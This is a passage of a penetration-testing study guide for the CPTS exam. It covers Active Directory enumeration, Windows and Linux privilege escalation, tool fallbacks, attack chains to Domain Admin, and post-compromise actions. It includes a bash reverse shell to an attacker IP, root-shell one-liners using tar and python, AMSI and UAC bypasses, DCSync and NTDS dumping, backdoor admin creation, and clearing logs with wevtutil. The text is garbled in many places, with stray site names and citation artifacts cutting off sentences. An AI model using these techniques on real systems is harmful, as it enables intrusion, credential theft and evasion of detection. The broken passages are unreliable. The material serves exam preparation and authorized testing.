SharpHound (Automated via BloodHound): SharpHound will automatically collect a broad set of AD data (users, groups, ACLs, sessions, trusts, etc.) and output JSON for BloodHound analysis. Pros: Comprehensive – it finds things you didn’t even know to look for (like that one user with GenericAll on an OU). It’s a huge time-saver to reveal complex multi-step paths (e.g., user → to group → has sessions → on server → admin to domain). In CPTS, where AD is a big focus, this can be your “find everything” button. Cons: It can be overkill; the data dump might be large and take time to sift (thus knowing queries as above helps). Also, running SharpHound in full collection mode can be noisy and sometimes troublesome to execute (e.g., requires .NET and domain connectivity on the compromised host; in one case if run from a non-domain box with just credentials, you’d use the Python BloodHound or run SharpHound with explicit domain controller targeting). In exam conditions, the trade-off is usually worth it: run SharpHound early so you don’t overlook an easy win (like a forgotten “Password in Description” attribute【49†L228-L236】). If SharpHound isn’t feasible (no GUI to analyze or no execution on target), then rely on manual methods.
Built-in Manual Commands: These include using net commands (net user username /domain, net group "Domain Admins" /domain), WMI queries, nltest, and the ActiveDirectory PowerShell module (if available). For instance, nltest /domain_trusts lists trust relationships – a quick manual check that SharpHound would also give you but perhaps later. whoami /groups on a compromised user tells you if they’re in any interesting AD group (sometimes an account might surprisingly be in Backup Operators or Account Operators, etc., which are escalation vectors). Pros: 100% OPSEC safe (just looks like normal admin commands), and no dependencies. Also, manual output is right in front of you to copy into notes. Cons: It’s piecemeal; you have to know what to look for. The exam might hide a clue that only a specific command reveals (e.g., a user’s description contains a password – PowerView’s Find-UserField would catch it, but manually you’d have to enumerate all users and inspect descriptions – doable with net user /domain but very tedious unless scripted).
Reducing overhead with fast aliases & scripts: Given the time crunch, you can prepare a “one-liner” enumeration script (a batch or PowerShell script) that runs a bunch of quick checks and prints results. For example, a PowerShell one-liner could: list current user groups, list local admins, list domain admins, check the domain password policy, and find any SPNs:
powershell
Copy
Edit
whoami /priv; net localgroup administrators; net group "Domain Admins" /domain; net accounts /domain; powershell -c "Import-Module ActiveDirectory; Get-ADUser -Filter {ServicePrincipalName -ne $null} -Properties ServicePrincipalName | Select Name,ServicePrincipalName"
This is a bit messy but demonstrates hitting many points at once. You could execute such a script after getting a shell to quickly dump vital info. Alternatively, use tools like WinPEAS in “enum domain” mode (if run on a domain-joined machine with some privileges, it will enumerate domain info too). Another trick: leverage CrackMapExec/NetExec for enumeration. CME can pull list of users, groups, and even identify misconfigs in one sweep (e.g., cme smb <DC-IP> -u <user> -p <pass> --users --groups --password-policy). That’s automated enumeration from your attacker machine without needing to run scripts on the target. It’s fast and gives results in one place. Caveat: CME’s output might be overwhelming; but if you’re comfortable with it, it’s a huge time-saver. For example, CME will plainly tell you “[*] Dumping password policy” and “Lockout threshold: 5” etc., which you’d otherwise get via net accounts /domain. Manual vs Automated in practice: A balanced approach in CPTS is often: run a broad automated collection early (SharpHound) while doing manual quick checks in parallel. For instance, once you pop an initial shell, you could start SharpHound and in the meantime manually check “low-hanging fruit” – is this user a local admin somewhere (try a simple lateral movement with their creds), any accessible shares (net view \\\\fileserver\\), any plaintext creds on the box (search for password in config files). Manual enumeration shines in these immediate areas (often the exam planted an obvious clue like an unattend.xml with creds, or a share with a config file). Automated enumeration shines in mapping the whole AD which is crucial for the endgame. Finally, note that the exam emphasizes manual skills – the CPTS course explicitly stresses manual enumeration【49†L289-L296】. This means as a candidate you should not solely rely on running one script and calling it a day. Use the automated tools to augment, not replace, your own enumeration. Cross-verify critical findings manually. If SharpHound says User X has admin on Machine Y, double-check by attempting a login or using psexec/WinRM to that machine with User X’s creds. This habit ensures you don’t chase false positives and demonstrates to the exam graders that you understand what the tools report. TL;DR: Automate breadth (to see the big picture), manually focus depth (to verify and uncover details). Combining both gives a complete view efficiently – and efficiency is exactly what you need during a 10-day marathon exam.
Privilege Escalation Cheat Sheet (Windows & Linux)
Elevating privileges on compromised systems is a core part of CPTS. Here’s a cheat sheet covering common Windows and Linux priv-esc methods, tools, and notes on kernel exploits – distilled from experience and “gotchas” encountered in practice: Windows PrivEsc:
Check Your Privileges: Immediately run whoami /priv on a Windows shell. If you see high-value privileges enabled like SeImpersonatePrivilege or SeBackupPrivilege, you have a quick path. For SeImpersonate (the famous JuicyPotato bug target), tools like JuicyPotatoNG or PrintSpoofer can get you SYSTEM via token impersonation【13†L340-L348】. If SeBackup is enabled, you can abuse it to read any file (including SAM/SECURITY hives). Pitfall: these techniques sometimes fail on newer OS or misconfiguration – always check OS build and if the known exploits for these tokens apply (e.g., PrintSpoofer works up to Server 2019 but not after certain patches).
Services and Scheduled Tasks: Look for misconfigured services:
Unquoted Service Path: A service path like C:\Program Files\Some Application\bin\app.exe (without quotes and with spaces) might let you place an executable in C:\Program Files\Some.exe to hijack it. Tools like WinPEAS highlight unquoted paths【13†L346-L354】. To manually find, run wmic service get name,pathname,startmode | findstr /i "C:\Program Files" and see if quotes are missing.
Weak Service Permissions: If you can modify a service (change its binPath or start it), you can inject your payload. Use accesschk.exe -uwcq YOUR-USER * to find services where your user has write or start rights. Or PowerView’s Get-ModifiableService for domain services.
Scheduled Tasks: Check schtasks /query /fo LIST /v – if any task runs a script or program you can edit, that’s a win. E.g., a task running as SYSTEM calling a .bat file in a writable location.
AlwaysInstallElevated: A quirky one – if the registry keys HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated (and the HKCU equivalent) are set to 1【13†L348-L354】, any user can install a MSI with SYSTEM privileges. Test it: if yes, generate an MSI reverse shell (there are tools/scripts for that) and msiexec it.
Credential Issues (Windows): Sometimes, the easiest priv esc is finding creds:
Check for saved creds in files: dir /s *pass* == *cred* across user directories. Common locations: C:\Users\<User>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt (PowerShell history), configuration files for programs (e.g., PuTTY, WinSCP, FileZilla often store creds in XMLs【16†L843-L851】).
Dump SAM & LSA Secrets if admin: If you’re local admin but not SYSTEM, you can use Volume Shadow Copy to copy the SAM and SYSTEM registry hives (or invoke Mimikatz’s LSA dump). This often yields other local accounts’ hashes or plaintext creds (in LSA Secrets for autologon, etc.). On modern OS, you might need to disable or bypass LSASS protections (e.g. via ProcDump or comsvcs DLL).
Reuse credentials: Found a password for one user? Try it for Administrator or another user on the host (especially if the environment doesn’t enforce smart unique passwords). Also, pivot those creds to other machines (this blurs into lateral movement, but it can effectively escalate your privileges if that user is admin elsewhere). Common pitfall: forgetting to try trivial creds – e.g. “Password123!” might be reused by multiple local admins.
Kernel Exploits (Windows): Less common in modern Windows since patch cycles are frequent, but not impossible in labs:
Identify OS build: systeminfo and note OS Name and Version. Cross-reference with known exploits. For instance, Windows 7 / Server 2008 R2 unpatched might be vulnerable to MS10-015 (KiTrap0D) or MS16-098 exploit. Windows 10 builds pre-1803 might have JuicyPotato for token exploit; post-1809 require RoguePotato or PrintNightmare depending on config【13†L342-L347】.
Tools like Windows-Exploit-Suggester (WES-NG) help: supply systeminfo output, it’ll list applicable missing patch exploits (like MS17-010 if it’s Win7 with no patch). If you see something like MS17-010 (EternalBlue) missing and you’re on a loca​
BRUNOROCHAMOURA.COM
t’s actually more for lateral movement, but MS15-051 (if listed) is a known priv esc for Windows 7/2008.
**Always double-check exp​
BRUNOROCHAMOURA.COM
​
BRUNOROCHAMOURA.COM
, a kernel exploit that BSODs a machine can cost you time. Read others’ experiences if you recall (for example, many OSCP folks know some older exploits are unstable). If you must run one, try to do it after collecting evidence from that machine, just in case it goes down and is reverted.
Other Windows Tricks: DLL Hijacking – if you find a program that runs as admin on startup and looks for a DLL in a writable path, you can trojan that DLL. UAC bypass – if you have a local admin but faced with User Account Control, many known bypasses (like fodhelper.exe registry hijack) can elevate to SYSTEM. These may be needed if the exam scenario gives you a medium-integrity admin shell. Also consider AppLocker Bypass/Lateral – if executables are restricted, use PowerShell or trusted binaries (LOLBins) to perform actions (this is more of a pivoting limitation than priv esc, but worth noting if environment is hardened).
Linux PrivEsc:
Sudo Misconfigurations: The top item: run sudo -l. If it lists any permitted commands, that’s your path. Common scenarios:
No Password sudo: If your user can run some command as root without a password, see if you can exploit it. e.g. sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh spawns a root shell (tar is being run as root) – this is a well-known GTFOBin for tar. Many binaries like vi, less, find, etc., have escape sequences (documented on GTFOBins)【16†L815-L818】. The exam might include something like user ALL=(ALL) NOPASSWD: /usr/bin/zip – which you’d exploit (for zip, use the -T flag trick to run shell).
Wildcard in sudo (Shellshock): If the sudo rule has wildcards, e.g. sudo /usr/bin/less /var/log/*, you can often manipulate the environment (LESSOPEN env var to get command execution). Be creative – these are often CTF-like but appear in exams to test your knowledge of sudo vulnerabilities【13†L309-L317】.
SUID/SGID Files: Run find / -perm -4000 -type f -ls 2>/dev/null to list SUID binaries. Compare against a baseline (know common ones). Look for unusual ones (e.g. a SUID vim or nmap, which can be abused to spawn shell). Even standard ones can be abused: e.g. sudo itself being SUID (rare), or find marked SUID (you can make it execute a shell with the -exec flag). The GTFOBins list is your friend here too. If an exam drops a custom SUID binary, download it (scp user@box:/path/to/bin .) and reverse engineer (even a simple strings to see what it does). Often, custom SUID programs are exploitable via insecure system() calls or file accesses (like the program might do open("/tmp/config") without dropping privileges – race to put your own /tmp/config as root).
Capabilities: Linux capabilities can allow a binary to do elevated actions without full root. Check with getcap -r / 2>/dev/null. For example, if you find python3.8 = cap_setuid+ep, it means that python can set UID – you can use that to spawn a shell as root (python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'). Or tar = cap_dac_read_search+ep means tar can read any file (not direct root shell, but you could read /etc/shadow). Capabilities are less obvious, but tools like LinPEAS flag them boldly【13†L313-L321】.
Cron Jobs: If there’s a cron job running as root that you can tamper with, it’s game over. Common exam trick: a cron job executes a script in /tmp or /var/www that is world-writable. If r&#8203;:contentReference[oaicite:55]{index=55}g a script every minute, edit that script to spawn a root shell or reverse shell. Sometimes the cron job is a benign one like backing up files, but it might call taron a directory you can write to – exploit that by dropping a malicious file named after tar’s--checkpoint-action(this is advanced, but known in CTFs). Simpler: if you can write to the script, just putbash -i >& /dev/tcp/yourIP/4444 0>&1 in it. In exam reports, show the crontab (cat /etc/crontabor in/etc/cron.d`) to justify the exploit.
NFS root_squash: If an NFS share is exported with no_root_squash, an​
BRUNOROCHAMOURA.COM
e to it, you can create a suid binary on the client that will be owned by root on the server. For example, write a simple C setuid shell to the share, it appears on the server with root ownership, then execute it on server to get root. Check /etc/exports or exportfs -v if you have access on an NFS server. This is more situational, but a known priv esc vector【13†L316-L324】.
Kernel Exploits (Linux): Many older kernels have public exploits (DirtyCow, DirtySock, DirtyPipe, 
BRUNOROCHAMOURA.COM
 lots of “dirty” ones【13†L322-L324】). Identify the kernel: uname -r. Also note OS version (lsb_release -a or contents of /etc/os-release). Cross-check with known exploit DB. For instance:
Kernel 4.4.x on Ubuntu 16.04 might be DirtyCow (CVE-2016-5195) vulnerable – an exploit to write to read-only files (often used to overwrite /etc/passwd to add a root user).
Kernel 5.x – check for DirtyPipe (CVE-2022-0847) on unpatched 5.8+ (if exam is up-to-date, maybe not).
PwnKit (CVE-2021-4034) – actually not kernel, but a SUID program (polkit’s pkexec) – if that’s present and not patched, any user can root by a simple C program. This one was big; LinPEAS screams about it if found.
Matching exploit to OS: Use automated suggester like linux-exploit-suggester.sh – it lists likely exploits by kernel version. But always verify manually. If it suggests “try exploit X”, search if that exploit applies to the distro (sometimes kernel compile options matter). If you choose to compile and run a kernel exploit, do it late in your enumeration (ensuring no easier method exists) and be prepared for a possible crash. On exam, a crash might revert a VM; you could lose some progress on that machine.
Common Pitfalls in PrivEsc: One is tunnel vision – assuming a kernel exploit is needed when a simpler misconfig is present. Always exhaust configuration issues (sudo, suid, credentials) before risky exploits. Another pitfall: not verifying architecture. If you compile an exploit on x64 for x86 or vice versa, it will just error – use uname -m to see if 64-bit. Also, tool reliability: LinPEAS is fantastic for breadth, but it might flag false positives (e.g., it might list a SUID file that is actually intended by the system and not exploitable). Use your judgment – just because it’s red in LinPEAS doesn’t mean it’s the vuln. Double-check manually or consult GTFOBins/hacktricks notes for that item.
In summary, approach privilege escalation methodically:
Enumerate (use WinPEAS/LinPEAS but also manual commands).
Identify obvious paths (sudo rights, SUID files, passwords, vulnerable software).
Prioritize low-hanging fruit (use existing credentials or misconfigs) before exploiting the kernel.
Keep a repertoire of 2-3 go-to exploits per OS version ready in your notes, so you don’t scramble for code under pressure.
This cheat sheet and your prior practice should cover 90% of priv esc scenarios. And remember, if you get root/System, loot the system (configuration files, credentials) before moving on – that often leads to the next target.
Tool and Script Failures: Fallback Tactics
In a long engagement like CPTS, not everything will work smoothly. It’s important to anticipate common tool failures and have backup methods. Here are some frequent issues and “Got This, Do That” remedies:
PowerView Crashing or Not Running: You might import PowerView and it exits with no output or throws an error (could be PowerShell constrained language mode, or missing .NET functions). Got This? – Do That: Try a different tool to fetch similar info. For AD enumeration, if PowerView fails, use AD CMDlets (if availab​
BRUNOROCHAMOURA.COM
ll) or SharpView (a compiled .exe version of PowerView). For example, instead of Get-NetUser, you can run Get-ADUser -Filter * (requires RSAT tools or run from a domain controller or a system with those modules). If executing scripts is the issue (e.g. Execution Policy or AMSI blocking), use a one-liner AMSI bypass or encode the script in base64 (powershell -Enc ...). Another fallback: run partial PowerView functionality via BloodHound’s Collectors (SharpHound). It may not list everything PowerView does, but it will capture users, groups, ACLs, etc., which covers most of what you need. Caveat: If the exam environment actively restricts PowerShell (some labs do), consider using command-line tools like nltest, dsquery, and net commands as discussed – they can retrieve a lot without needing PowerView.
GetUserSPNs.py (Impacket) Timeouts: This typically happ​
BLACKHILLSINFOSEC.COM
e domains or network latency issues. Got This? – Do That: Narrow the query. Impacket allows an LDAP filter: GetUserSPNs.py domain/user:pass -filter servicePrincipalName=*. If that still times out, use a different approach: ​
WHYNOTSECURITY.COM
in PowerShell – e.g., [System.DirectoryServices.DirectorySearcher] in PowerShell to query servicePrincipalName=*. Alternatively, use setspn from a Windows shell: setspn -T DOMAIN -Q */* – this queries all SPNs in the domain (it will list HOST/machine SPNs too, but you can focus on those with “/” to find user SPNs). If even that fails due to permissions, fall back to BloodHound data if you have it; BloodHound marks Kerberoastable users anyway. For AS-REP roasting, if Impacket’s GetNPUsers is acting up, you can attempt the same via a simple Python script using ldap3 library or even a tool like kerbrute (which can enumerate AS-REP roastable accounts offline). The key is, every Impacket function has an alternate path: Impacket is great, but maybe use CME’s --kerberoast feature or Rubeus on Windows to request SPN tickets.
Evil-WinRM Quirks: Evil-WinRM is a popular way to get an interactive PowerShell on a remote Windows host via WinRM. Common issues:
Failing to Connect: You might get an error or no response. Check: is WinRM (port 5985/5986) open? If not, Evil-WinRM won’t work – you might need to enable WinRM via another method or use a different shell approach (like psexec.py or WMI). If the port is open but creds fail, ensure the format is correct (sometimes need -d DOMAIN if using domain creds). Also, some older Windows versions or hardened ones require SSL – try the -S flag (ssl) or -i to specify host.
No Output / Partial Output: A known Evil-WinRM quirk – large command output can get truncated. Got This? – Do That: If output is too large, redirect it to a file and then use Evil-WinRM’s file download: e.g., run ipconfig /all > C:\Temp\ip.txt then download C:\Temp\ip.txt. Evil-WinRM has built-in upload/download which is very handy for such cases and transferring tools.
File Upload Failure: If you try to upload a file and it errors, verify your path (Evil-WinRM uploads to the current working directory on target by default, which might be C:\Users\Administrator\Documents or so). If it still fails, a backup is using certutil -urlcache from your attacker HTTP server, or encoding file in base64 and decoding on target. But usually Evil-WinRM’s file transfer is reliable.
WinRM Restricted for non-Admins: By default, only admins can WinRM. If you’re trying Evil-WinRM with a low-priv user and it says access denied, that’s normal. Then you know that method won’t work until you have admin creds – switch to SMB or WMI based methods for that user (like wmiexec.py which may allow a semi-interactive shell for any user who has WMI access). In some cases, organizations allow certain users WinRM​
MEDIUM.COM
se, assume WinRM is for admins.
Quitting Unexpectedly: If Evil-WinRM crashes mid-session (maybe due to network glitch), your context on target is lost. In an exam, immediately log what you had in that session (any creds or flags you saw) so you don’t lose info. Then just reconnect – WinRM is stateless, so start a new Evil-WinRM session. If it persistently crashes at a certain command, run that command in a different way (maybe it’s trying to render something fancy? e.g., running an interactive menu script might not play well – try a different shell or execute piece by piece).
Responder and Network Poisoning Tools: You might attempt LLMNR/NBT-NS poisoning with Responder to catch hashes. Sometimes, Responder sits quietly with no results (maybe because the lab network had it disabled or hosts are not making those queries). Got This? – Do That: Don’t spend too long waiting; if Responder hasn’t snagged anything in hours, move on – perhaps the network is configured in a way that doesn’t yield hits. Instead, use active techniques: for example, run Invoke-LLMNR-Proxy or t​
BRUNOROCHAMOURA.COM
ng if appropriate. If Responder itself fails to start (like Permission denied on some interfaces), ensure you ran as root and specified the correct interface/IP. As a fallback, use Inveigh (PowerShell LLMNR/NBNS spoofer) on a Windows pivot host – sometimes attacking from inside yields creds if the domain controller or other systems make name resolution requests.
Metasploit / MSFVenom Issues: While CPTS isn’t Metasploit-centric, you might generate a payload with msfvenom or use Meterpreter in a pinch. Common fail: the payload gets caught by AV or just doesn’t connect back. Got This? – Do That: Try a different payload type (e.g., if EXE gets caught, try a Powershell payload or reflective DLL). Or use a simpler native payload like cmd.exe reverse shell one-liner, which is less likely flagged than Meterpreter. If multi/handler (Metasploit listener) is acting up, remember you can always use netcat or PowerShell’s Invoke-WebRequest + Start-Process combos to catch shells. Basically, Metasploit is not mandatory – have a manual shell payload alternative ready.
Linux Scripts Failing: Perhaps LinPEAS terminates unexpectedly (maybe due to an aggressive kernel logging). If a script like LinEnum or LinPEAS isn’t giving output, run pieces of it manually – e.g., check /etc/crontab, /etc/passwd, sudo -l yourself. No script can replace your eyes completely. If a compiled exploit on Linux fails (segfault), try an alternate version or source. Sometimes compile flags matter – a 32-bit exploit on 64-bit without proper flags will segfault. Recompile accordingly (-m32 for 32-bit if libraries allow). When a kernel exploit fails, it might also silently do nothing – don’t assume success until you verify whoami.​
BLACKHILLSINFOSEC.COM
s, move to next option or path.
BloodHound Data Import Failures: If you manage to collect BloodHound data but the UI or Neo4j is being temperamental (e.g., huge dataset not importing or queries not returning), you could query the raw JSON for critical info. The BloodHound JSON files can be searched with grep/jq. For instance, grep for "HasSession" or a specific username. It’s ugly, but if GUI breaks, the data is still there. Alternatively, rerun SharpHound in smaller chunks (e.g., --Exclude DC to skip domain controllers or targeting specific OUs) to reduce size. This is a last resort since BloodHound CE (Community) is usually stable, but good to keep in mind.
Fallback Mindset: The overall strategy is captured well by “Got this, do that.” For every tool in your arsenal, know at least one alternative. If one privilege escalation script doesn’t find anything, try another or manual. If one exploit fails, have another lined up. In your Obsidian notes, maintain a section perhaps titled "Plan B/C for Tools" – e.g., “If crackmapexec SMB crashes, use impacket smbexec”, “If unable to run WinPEAS, run manual checks X, Y, Z”. Having this written down means when you hit a wall, you don’t waste time recalling what else to try – your notes tell you.
Remember, part of the exam is adapting under pressure. Demonstrating that you can calmly switch tactics when a tool misbehaves shows professional maturity. It’s exactly what you’d do on a real engagement if your go-to method hit a snag. So anticipate the common failures (like those above) and you’ll solve them almost reflexively when they occur, keeping your momentum.
Real-World Attack Chains and Alternatives
To excel in CPTS, you should understand complete Active Directory attack chains end-to-end, and know alternate ways to achieve each step. Let’s outline a typical enterprise kill chain from initial access to Domain Admin, then explore substitutes at each phase: Example AD Compromise Chain: (Web App RCE) → (Foothold on Internal Server) → (Gather Credentials) → (Lateral Movement) → (Privilege Escalation to Domain Admin) → (Post-DA actions).
Initial Access – Foothold: Suppose you exploit a web application on a DMZ server and get RCE, planting a reverse shell. Now you have a low-priv user shell on an internal server (perhaps as user “WebUser”).
Alternatives: Initial access could also come from a leaked credential (say you found creds in a paste, so you try VPN/RDP/SMB login), or from phishing (outside exam scope). On CPTS specifically, initial foothold is often via a web vuln (SQLi, RCE, LFI to RCE, file upload, etc.)【10†L175-L183】. If Plan A (web RCE) fails, Plan B might be an exposed service exploit (e.g., a known RCE in Jenkins, Tomcat, etc. if those are present【10†L159-L167】【10†L163-L172】). Plan C could be password spraying on external services (like trying default creds on OWA, SSH, etc.). The key is to enumerate multiple attack surfaces so you have fallback entry points.
Establish Internal Recon & Basic User Privilege Escalation: On the compromised server, gather as much info as possible. Perhaps you find in config files a password for a service account. For example, web.config might contain a connection string with credentials. That gives you a reused credential “ServiceAccount:Password1”. You try that on the server itself and find it’​
MEDIUM.COM
 or you use it to login to another server via SMB.
Alternatives: If no creds are readily found, dump hashes. On Windows, use Mimikatz or LSASS dump if you have local admin. If not, maybe the web server was running as a service account – Kerberoast it. Or use that host to run Responder and catch hashes from other machines. At this stage, you pivot to lateral movement when ready, but if initial foothold is very low privilege, you might need an intermediate priv esc on that host (e.g., exploit a vulnerable driver to become SYSTEM on the web server). Always consider environment specifics: maybe the initial host is not domain-joined – then your goal is to p​
MEDIUM.COM
main (lateral movement might actually mean compromising a domain-joined box first, through RDP or another exploit).
Lateral Movement – Spreading through the Network: Using the credentials or access obtained, move to another host. In our example, say the “ServiceAccount” cred​
MEDIUM.COM
nternal database server. You login there and find it’s domain-joined and ServiceAccount is a domain user (maybe with some elevated privileges). On that DB server, you run SharpHound and see ServiceAccount is a member of “SQL Servers” group which has local admin on a bunch of machines. You pivot again to a machine where an actual domain admin might be logged in.
Alternatives: Lateral movement can be done with different methods:
Pass-the-Hash – if you have an NTLM hash of a user with admin rights, use it with psexec.py or CME.
Pass-the-Ticket – if you have a Kerberos ticket (say you captured a TGT with Mimikatz), use it with Rubeus or Mimikatz to auth to other services.
WMI/SMB/WinRM – multiple protocols exi​
THEYHACK.ME
​
THEYHACK.ME
nother might work. For instance, if RDP is disabled, try WinRM (Po​
THEYHACK.ME
​
THEYHACK.ME
M is closed, try SMB (psexec or schtasks).
Scheduled Task/Service – you might not have direct shell access but can execute commands remotely (e.g., sc.exe \\\\target create ...).
If credentials are limited, consider printer bug / SpoolSample (like the printerbug to coerce authentication, although that’s more a way to pull hashes from DC if you have a machine account to relay – advanced but a known alternative if stuck).
If a direct lateral move is failing (firewalls blocking SMB, etc.), use your pivot box as a jump host with proxy (Chisel/Ligolo as discussed) and attack internally from it.
Privilege Escalation to Domain Admin: Now you have footholds on a few machines and some credentials. Commonly, one path is: crack a kerberoasted service hash to get a service user that is a domain admin (sometimes labs do exactly this). Or find that the user you moved as (ServiceAccount) has GenericAll on some privileged group – then abuse that ACL to add yourself to Domain Admins【35†L193-L197】. Another classic: you got a user who is a local admin on the domain controller (e.g., part of “Server Operators”) – you can then log onto DC and dump NTDS.dit (thus retrieving all domain hashes). Let’s say in our chain, the ServiceAccount wasn’t DA, but it had a weak password that was reused for an account that is DA. Using password spraying or credential reuse checks, you find “SvcAdmin:Password1” works for “CORP\BackupAdmin” and that account is a Domain Admin. Now you effectively have DA creds – you login to a DC or use DCSync with mimikatz (lsadump::dcsync for Administrator hash)【49†L239-L247】.
Alternatives: There are many routes to DA:
Kerberoasting route: if cracking yields no result, try AS-REP roast, try password spraying (maybe that one user with “Password123” in description field).
Privileged groups abuse: if not DA directly, maybe you get to be Enterprise Admin via trust or Account Operators (who can reset passwords of others).
Zero-day / unpatched vulns: If by chance something like PetitPotam (certificate relay) is in scope【49†L243-L247】, that could jump you to DA by triggering the DC to authenticate to you and relaying to LDAP. Always check if DCs have MSRPC open and Certificate Services running (an alternate if all else fails in a lab).
Golden Ticket: if you compromise the KRBTGT account (usually after DA anyway), you can create a golden ticket to persist. Not needed for exam timeline, but good to mention as an alternate post-DA method to regain access if you somehow lost DA creds.
Essentially, have multiple paths in mind: if one fails (couldn’t crack any hashes), pivot to another (maybe try a different host’s loot, or exploit AD CS if present, or use brute-force on a misconfigured LDAP if allowed).
Post-DA Movement (Enterprise Dominance): After obtaining Domain Admin, ensure control over all domain assets. This might involve accessing the Domain Controller (if you weren’t on it yet) and exfiltrating the NTDS.dit (Active Directory database) or using secretsdump.py to dump all user hashes. Also consider if there are multiple domains/forests:
Alternatives: If there’s a trust to another domain (e.g., a child domain or a separate forest), you might need to exploit that trust. For instance, if you become DA in child domain, abuse the trust (like setting SID History or creating a cross-domain token) to escalate to the parent domain (this is CAPE territory; CPTS might not require multi-domain, but be aware). Another approach is forging trust tickets (Silver Ticket for services, or if Ente​
MEDIUM.COM
​
MEDIUM.COM
one forest, use it to compromise another via trust keys).
Throughout each phase, have a Plan B:
If initial exploitation via web fails, maybe there’s a weak credential somewhere (use OSINT or guess common passwords).
If that internal server had no goodies, maybe pivot to a workstation (perhaps an employee VM that had VMware tools with shared folders misconfigured, etc.).
If your cracked hash doesn’t yield DA, perhaps the user is one step away – look for delegation or ACL abuse possibilities.
Maintain situational awareness: every host compromise, enumerate it fully (running WinPEAS/LinPEAS each time, checking for files, etc.). Sometimes an attack chain can be cut short by a lucky find – e.g., you compromise a helpdesk user and on their desktop is a text file “DomainAdminCreds.txt”. It sounds contrived, but in practice labs often include such easter eggs to reward thorough enumeration. Don’t assume you must always do a 5-step chain; if a shorter path appears, take it.
Document the chain as you go. A simple diagram in your notes (even text-based) showing the path (“WebApp -> WebServer -> Creds -> DBServer -> ServiceAccount -> DC”) helps ensure you’ve covered alternatives at each arrow. That way, if one arrow breaks, you can find a detour. By building and practicing various chains (like the one above, or a Kerberoast-focused chain, or a DNSAdmins exploitation chain, etc.), you’ll be ready for whatever sequence the exam throws at you. And if one link is not working, you’ll recall another way to achieve the same effect (for example, no Kerberoastable accounts? Try abusing Password Spraying PASSWD_NOTREQD accounts【49†L230-L238】). In summary, think of the AD attack as a multi-route journey. You have a destination (Domain Admin), multiple checkpoints (initial foothold, lateral moves, privilege milestones), and several roads connecting them. If the main highway is closed, take the side roads – they might be slightly longer, but they’ll get you there just the same.
Post-DA Add-Value Actions
Achieving Domain Admin is often the “win” condition technically, but a true professional (and CPTS expects this) will continue to enumerate impact and provide value in the report. After Domain Admin, consider performing the following additional actions to demonstrate thoroughness (always within scope):
Password Auditing (DPAT and similar): With DA, dump the Active Directory password hashes (using ntdsutil or secretsdump.py). Then analyze those hashes. Use tools like Domain Password Audit Tool (DPAT)【36†L7-L15】 or even just hashcat + some rules to crack a portion of them. The goal is to identify weak password practices: e.g., “50% of accounts share only 3 passwords”, “password ‘Winter2025!’ is used by 10 users including one Domain Admin”【36†L13-L16】. This adds value by highlighting systemic risk (beyond the one-off exploits). In the report, you can include stats: number of cracked passwords, common patterns, any passwords matching breach data, etc. This kind of analysis, while not strictly required to “pwn” the network further, shows the client how an attacker can leverage weak credential policy to pivot or persist. If time permits, do at least a quick crack on Administrator or KRBTGT to check if they used something guessable (sometimes lab creators do set an easily crackable admin password as an extra finding).
Data Exfiltration & DLP Testing: As DA, you essentially have access to all files in the domain (unless there’s encryption). You might attempt to simulate data theft:
Search file servers or shares for sensitive keywords: e.g., personal data, financial records, “passwords.xlsx”, etc. You can script something with PowerShell (Get-ChildItem -Recurse with Select-String) or use Linux tools via SMB mounts. If you find confidential data, note it as evidence (with caution not to actually steal large amounts – just identify it).
If the engagement allows, test Data Loss Prevention (DLP) controls: e.g., try to copy a file with credit card numbers out through your attack machine, or email it out via a dummy account. If it succeeds with no blocks, that’s a valuable finding. In an exam environment, active exfil tests might not be doable (no internet out), but you can simulate by compressing files and seeing if any monitoring triggers on the host (check Windows Event Logs or any DLP agent presence).
Also consider shadow admin creation for persistence: as DA, create a dummy domain admin user or backdoor a domain group policy (like add a startup script that adds a new admin on reboot). Then see if any security product flags that. Reporting on lack of detection/persistence mechanisms is added value (e.g., “We were able to create persistent access that survived resets without detection”).
Domain Trust Abuse: If multiple domains exist (e.g., a parent and a child, or a DMZ domain and internal domain with a one-way trust), now is the time to exploit those trusts. For instance, if you are DA in Domain A and Domain B trusts A, you can create a Silver Ticket for Domain B’s KRBTGT (if trust is transitive and you have the trust keys). Another approach: use Mimikatz DCSync in Domain A to get the trust account password for Domain B (trust accounts are just user accounts). Then impersonate that on Domain B. These are advanced, but showing that “not only did we own DomainA, we leveraged that to also control DomainB due to an overly permissive trust” is a big value add in reports【35†L241-L250】. In simpler terms, if the lab has multiple domains, be sure to demonstrate you can compromise them all from one DA beachhead.
**Cleaning Up & Simulating Blue Team: While not explicitly asked, it can be impressive to show what traces your attack left and how to cover them. For example, if you used Mimikatz, note whether Event 4624/4625 (logon events) or 4672 (admin logon) were generated. If you added a user, check the AD replication or event logs for that action. Then consider demonstrating how an attacker might remove those logs or hide their tracks. This could be as simple as clearing the Security log with wevtutil, or using AuditPol to disable auditing (in a test environment). Including this in the report educates the client on how attackers hide, and thus why catching them is hard.
Leftover Credential Hunting: Even as DA, look for low-hanging fruit that would worry a client:
Are there old user accounts with no logon in years but still active? (Indicator of poor hygiene; mention it).
Are there accounts with PasswordNeverExpires or Passwd_Not_Required【49†L230-L238】 flags? (These are often used by service accounts; highlight if insecure).
Dump passwords from GPP (Group Policy Preferences) if present – as DA you can decrypt any GPP cpassword left in SYSVOL (legacy issue, but who knows).
Check if LAPS (Local Admin Password Solution) is deployed; if not, note that all local admins likely shared credentials and you could pivot that way (we possibly did). If yes, see if you can dump those passwords from AD (as DA you can read ms-MCS-AdmPwd attributes unless they configured permissions; if you can, that’s a finding about LAPS delegation).
If any shadow admins (users with high privileges but not obviously named or in default groups) exist – BloodHound’s “Detect Delegation/ACL based privs” helps here – mention them. Corporations often don’t realize a certain service account can effectively be DA due to ACLs.
Client Value Reporting Tips: While not part of exploitation, how you present the findings is crucial. Ensure you link each post-DA action to a business impact:
Cracked 70% of passwords → impact: demonstrates risk of credential stuffing and non-compliance with password policy.
Downloaded sensitive HR files → impact: potential data breach of employee PII.
Persistence created (new admin user) → impact: attacker could regain control even after incident response, leading to long-term compromise.
Trust abuse → impact: a breach in one subsidiary can cascade to parent company assets.
No alerts triggered during our actions → impact: security monitoring is lacking or misconfigured.
Also, provide clear recommendations for each:
Enforce strong unique passwords (perhaps implement passphrases or use password managers, as per the DPAT findings)【36†L7-L15】.
